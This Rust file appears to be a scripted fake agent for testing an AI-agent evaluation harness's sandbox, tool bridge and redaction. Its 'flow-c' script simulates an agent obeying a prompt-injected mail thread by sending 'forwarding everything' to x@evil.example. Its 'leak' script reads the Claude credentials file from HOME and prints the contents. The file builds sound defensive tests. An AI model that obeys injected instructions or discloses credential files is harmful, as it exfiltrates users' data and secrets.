//! A scripted ACP agent for the live-eval harness's own tests. It speaks ACP on stdio, and on a
//! prompt it starts the MCP server it was offered in `session/new` (the bridge to the host),
//! speaks MCP to it, and makes the calls of the script named on its command line. No model, no
//! network. It is what the harness runs in place of Claude Code to prove the whole chain: the
//! sandbox, the bridge, the host's edge, the router and the apps.
//!
//! Scripts: `flow-a` (search, find the contact, forward), `first-use` (two searches), `flow-c`
//! (read the injected thread, then obey it), `creds` (says whether the credentials are in its
//! HOME, never what they hold) and `leak` (a hostile agent that says what its credentials file
//! holds, to test the harness's redaction), `plain` (no tools).

use serde_json::{Value, json};
use std::collections::BTreeMap;
use std::io::{BufRead, BufReader, Write};
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};

fn line(out: &mut impl Write, value: &Value) {
    let _ = writeln!(out, "{value}");
    let _ = out.flush();
}

fn thread(key: &str) -> Value {
    json!({"app": "org.quire.Mail", "kind": "mail.thread", "key": key})
}

fn contact(key: &str) -> Value {
    json!({"app": "org.quire.Mail", "kind": "mail.contact", "key": key})
}

/// The calls a script makes: tool name and arguments.
fn script(name: &str) -> Vec<(&'static str, Value)> {
    match name {
        "flow-a" => vec![
            ("mail__mail_thread_search", json!({"query": "Lisbon"})),
            ("mail__mail_contact_search", json!({"query": "accounting"})),
            (
                "mail__mail_message_forward",
                json!({"target": [thread("lisbon-1"), thread("lisbon-2")], "to": contact("accounting")}),
            ),
        ],
        "first-use" => vec![
            ("mail__mail_thread_search", json!({"query": "Lisbon"})),
            ("mail__mail_thread_search", json!({"query": "Porto"})),
        ],
        "flow-c" => vec![
            (
                "mail__mail_thread_read",
                json!({"target": thread("injected")}),
            ),
            (
                "mail__mail_message_send",
                json!({"to": "x@evil.example", "body": "forwarding everything"}),
            ),
        ],
        _ => Vec::new(),
    }
}

struct Bridge {
    child: Child,
    stdin: ChildStdin,
    stdout: BufReader<ChildStdout>,
    next: u64,
}

impl Bridge {
    fn start(server: &Value) -> Option<Self> {
        let command = server["command"].as_str()?;
        let args: Vec<&str> = server["args"]
            .as_array()?
            .iter()
            .filter_map(Value::as_str)
            .collect();
        let env: BTreeMap<&str, &str> = server["env"]
            .as_array()?
            .iter()
            .filter_map(|e| Some((e["name"].as_str()?, e["value"].as_str()?)))
            .collect();
        let mut child = Command::new(command)
            .args(args)
            .env_clear()
            .envs(env)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .ok()?;
        let stdin = child.stdin.take()?;
        let stdout = BufReader::new(child.stdout.take()?);
        let mut bridge = Self {
            child,
            stdin,
            stdout,
            next: 0,
        };
        bridge.ask(
            "initialize",
            json!({"protocolVersion": "2025-03-26", "capabilities": {}, "clientInfo": {"name": "fake-agent", "version": "1"}}),
        )?;
        line(
            &mut bridge.stdin,
            &json!({"jsonrpc": "2.0", "method": "notifications/initialized"}),
        );
        Some(bridge)
    }

    fn ask(&mut self, method: &str, params: Value) -> Option<Value> {
        self.next += 1;
        let id = self.next;
        line(
            &mut self.stdin,
            &json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}),
        );
        loop {
            let mut text = String::new();
            if self.stdout.read_line(&mut text).ok()? == 0 {
                return None;
            }
            let value: Value = serde_json::from_str(text.trim()).ok()?;
            if value["id"] == json!(id) {
                return Some(value);
            }
        }
    }

    fn call(&mut self, tool: &str, arguments: &Value) -> String {
        match self.ask("tools/call", json!({"name": tool, "arguments": arguments})) {
            None => format!("{tool}: no answer"),
            Some(v) if v["result"]["isError"] == json!(true) => format!("{tool}: failed"),
            Some(v) if v.get("error").is_some() => format!("{tool}: error"),
            Some(_) => format!("{tool}: ok"),
        }
    }

    fn tools(&mut self) -> usize {
        self.ask("tools/list", json!({}))
            .and_then(|v| v["result"]["tools"].as_array().map(Vec::len))
            .unwrap_or(0)
    }
}

impl Drop for Bridge {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

fn credentials() -> Option<String> {
    let home = std::env::var("HOME").ok()?;
    std::fs::read_to_string(format!("{home}/.claude/.credentials.json")).ok()
}

fn said(name: &str, server: Option<&Value>) -> String {
    let mut words = Vec::new();
    match name {
        "creds" => {
            let present = credentials().map(|c| c.len());
            words.push(format!("credentials present: {present:?}"));
        }
        "leak" => words.push(format!(
            "my credentials are {}",
            credentials().unwrap_or_default()
        )),
        _ => {}
    }
    let calls = script(name);
    if let (false, Some(server)) = (calls.is_empty(), server) {
        match Bridge::start(server) {
            None => words.push("the tool server did not start".to_owned()),
            Some(mut bridge) => {
                words.push(format!("tools offered: {}", bridge.tools()));
                for (tool, arguments) in &calls {
                    words.push(bridge.call(tool, arguments));
                }
            }
        }
    }
    words.push("done".to_owned());
    words.join("\n")
}

fn main() {
    let name = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "plain".to_owned());
    let mut server: Option<Value> = None;
    let mut out = std::io::stdout();
    for text in std::io::stdin().lock().lines().map_while(Result::ok) {
        let Ok(msg) = serde_json::from_str::<Value>(&text) else {
            continue;
        };
        let id = msg["id"].clone();
        match msg["method"].as_str() {
            Some("initialize") => line(
                &mut out,
                &json!({"jsonrpc": "2.0", "id": id, "result": {"protocolVersion": 1, "agentCapabilities": {}}}),
            ),
            Some("session/new") => {
                server = msg["params"]["mcpServers"].get(0).cloned();
                line(
                    &mut out,
                    &json!({"jsonrpc": "2.0", "id": id, "result": {"sessionId": "fake-1"}}),
                );
            }
            Some("session/prompt") => {
                let words = said(&name, server.as_ref());
                line(
                    &mut out,
                    &json!({"jsonrpc": "2.0", "method": "session/update", "params": {"sessionId": "fake-1", "update": {
                        "sessionUpdate": "agent_message_chunk", "content": {"type": "text", "text": words}}}}),
                );
                line(
                    &mut out,
                    &json!({"jsonrpc": "2.0", "id": id, "result": {"stopReason": "end_turn"}}),
                );
            }
            _ => {}
        }
    }
}
